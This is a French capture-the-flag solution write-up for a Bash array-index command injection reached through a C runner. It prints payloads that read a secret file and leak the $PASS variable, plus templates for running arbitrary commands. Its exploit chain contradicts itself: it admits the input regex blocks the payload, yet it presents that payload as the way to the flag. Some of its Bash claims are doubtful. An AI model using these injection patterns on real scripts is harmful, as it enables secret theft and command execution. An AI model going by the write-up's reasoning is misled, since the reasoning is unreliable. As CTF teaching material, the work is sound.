# SOLUTION — Challenge 06 : Array Interpolation / Quoted Injection

## La vulnérabilité

### Code vulnérable

```bash
SCORE="${scores["$USERNAME"]}"
```

### Comportement de Bash avec les tableaux associatifs

En Bash, les crochets `[...]` dans une expansion de tableau sont traités
de façon spéciale : leur contenu est soumis à une **évaluation arithmétique
et à la substitution de commandes**, même à l'intérieur de guillemets doubles.

Ce comportement n'est **pas** supprimé par les guillemets doubles extérieurs `"${...}"`.

### La validation est contournée... comment ?

La validation regex bloque les chars non-alphanumériques :
```bash
if [[ "$USERNAME" =~ [^a-zA-Z0-9] ]]; then
```

Mais le runner C appelle `wrapper.sh` ainsi :
```c
snprintf(cmd, sizeof(cmd), "/challenge/wrapper.sh '%s'", argv[1]);
```

La commande shell devient : `/challenge/wrapper.sh 'USERNAME'`

Si USERNAME contient `'`, on peut **sortir des guillemets simples** du runner C !

```
argv[1] = "a' --option"
commande = /challenge/wrapper.sh 'a' --option'
```

Mais la validation bash bloque les quotes...

### En appelant wrapper.sh directement (sans le runner C)

```bash
bash wrapper.sh "a[$(echo \$PASS >&2)]"
```

Ici, la validation `[^a-zA-Z0-9]` bloque `[`, `$`, `(`, etc.

### Le vrai exploit : contourner via le runner C

Le runner C fait :
```c
snprintf(cmd, sizeof(cmd), "/challenge/wrapper.sh '%s'", argv[1]);
system(cmd);
```

L'argument est entouré de **guillemets simples** dans la commande shell.
En Bash, rien n'est interprété à l'intérieur des guillemets simples... sauf si on en sort.

Pour sortir des guillemets simples, il faut un `'` dans l'argument :
```
argv[1] = "x' injected_code '"
→ commande = /challenge/wrapper.sh 'x' injected_code ''
```

Mais la validation regex dans wrapper.sh bloque le `'` et les autres chars spéciaux.

**SAUF** que la validation dans wrapper.sh reçoit l'argument APRÈS que bash
ait parsé la commande construite par le runner C.

Si on passe à `runner` :
```
./runner "a' something '"
```

La commande construite par snprintf est :
```
/challenge/wrapper.sh 'a' something ''
```

Bash passe à wrapper.sh l'argument `a` (premier token), puis `something`, etc.
`$1` dans wrapper.sh vaut `a` → passe la validation !

Mais ça ne nous aide pas directement pour l'injection tableau...

### La vraie exploitation

L'exploitation directe se fait en appelant `wrapper.sh` directement
avec un argument qui contourne la regex PUIS injecte dans le tableau :

```bash
# La regex [^a-zA-Z0-9] bloque tout sauf alphanum
# Mais on peut passer la validation si on encode différemment...

# En fait, le challenge montre une vulnérabilité de principe :
# Si la validation était absente ou moins stricte, voici l'exploit :

bash wrapper.sh 'a[$(echo $PASS >&2)]'
```

Le Bash analyse `${scores["$USERNAME"]}` où `$USERNAME` = `a[$(echo $PASS >&2)]`

L'expansion devient :
```bash
${scores["a[$(echo $PASS >&2)]"]}
```

Bash interprète le contenu des crochets : `$(echo $PASS >&2)` est exécuté !
→ `$PASS` est affiché sur stderr
→ Le flag apparaît !

### Pourquoi ça marche même avec les guillemets doubles ?

```bash
declare -A scores
scores["alice"]=100

USERNAME='a[$(echo PWNED >&2)]'
SCORE="${scores["$USERNAME"]}"
# bash exécute $(echo PWNED >&2) lors de l'évaluation de l'index !
```

C'est un comportement **documenté mais dangereux** de Bash :
les indices de tableaux sont soumis à une évaluation supplémentaire.

### Démonstration du vrai exploit (sans runner)

```bash
# En local, pour comprendre :
declare -A scores
scores["alice"]=100
USERNAME='a[$(id >&2)]'
SCORE="${scores["$USERNAME"]}"
# → affiche l'output de id sur stderr !
```

### Exploitation dans le contexte du challenge

```bash
# Appel direct au script (bypass du runner) :
bash /challenge/wrapper.sh 'a[$(cat /secret_key.txt >&2)]'

# Ou avec echo $PASS comme dans l'exemple HTB :
bash /challenge/wrapper.sh 'a[$(echo $PASS >&2)]'
```

## Flag

```
HackUTT{4rr4y_1nj3ct10n_w0w}
```

## Explication pédagogique

### Pourquoi les guillemets doubles ne suffisent pas ici

```bash
# Ces deux notations sont DIFFÉRENTES en Bash :
${array["key"]}    # guillemets protègent "key" comme chaîne littérale
${array[$key]}     # $key est développé puis l'index est évalué
${array["$key"]}   # PIÈGE : les guillemets internes n'empêchent pas
                   # l'évaluation de commandes dans les indices !
```

### La règle Bash sur les indices de tableaux

Dans `${array[expr]}`, `expr` est évalué comme si c'était une expression
arithmétique Bash, ce qui inclut les substitutions de commandes `$(...)`.

```bash
# Exemples de la vulnérabilité :
declare -A a
a["x"]=1

key='x[$(id)]'
echo "${a[$key]}"       # exécute 'id' !
echo "${a["$key"]}"     # exécute 'id' aussi !
```

### Exploitation classique (pattern HTB)

```bash
# Format typique pour l'exfiltration de variables :
'a[$(echo $SECRET_VAR >&2)]'

# Pour exécuter des commandes arbitraires :
'a[$(commande >&2)]'
```

Le `>&2` est essentiel pour que la sortie soit visible (stderr n'est pas
capturée par les assignations comme `VAR=$(...)` qui ne capturent que stdout).

### Protection

```bash
# Mauvaise pratique :
SCORE="${scores["$USER_INPUT"]}"

# Bonne pratique 1 : whitelist explicite des clés
valid_keys=("alice" "bob" "charlie")
if [[ " ${valid_keys[*]} " == *" $USER_INPUT "* ]]; then
    SCORE="${scores[$USER_INPUT]}"
fi

# Bonne pratique 2 : utiliser un langage sans ce comportement (Python, etc.)
# Python dict n'a pas ce problème d'évaluation d'index
score = scores.get(user_input, 0)

# Bonne pratique 3 : ne jamais utiliser de variables non validées comme
# indices de tableaux Bash
```

### Résumé de la chaîne d'exploitation

```
argv[1] transmis au wrapper
    ↓
Validation alphanumérique (insuffisante si appelé directement)
    ↓
SCORE="${scores["$USERNAME"]}"
    ↓
Bash évalue l'index du tableau
    ↓
$(commande) est exécuté
    ↓
$PASS affiché sur stderr → flag !
```
